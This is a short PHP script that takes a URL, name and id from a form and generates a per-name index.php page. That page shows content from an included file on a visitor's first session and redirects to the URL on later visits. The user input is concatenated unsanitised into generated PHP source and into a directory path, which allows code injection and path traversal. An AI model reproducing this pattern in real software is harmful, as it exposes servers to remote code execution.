<?php


$link = $_POST["url"];
$name = $_POST["name"];
$id=$_POST["id"];

$location = $name.'/index.php';



$script2='
<?php

ignore_user_abort(TRUE);
session_start();

  $name="'.$name.'";
$id="'.$id.'";
$url="'.$link.'";


require "../prs.php";



   if(!isset($_SESSION["hasVisited"])){
    $_SESSION["hasVisited"]="yes";
    
echo $script;

  }
else 
header("Location: '.$link.'"); 




?>



';




if (!file_exists($location)) {


mkdir($name, 0755);




$myfile = fopen($location , "w") ;



fwrite($myfile, $script2);

fclose($myfile);

echo 'DONE';

}

else {

echo "EXIST";

}



?>		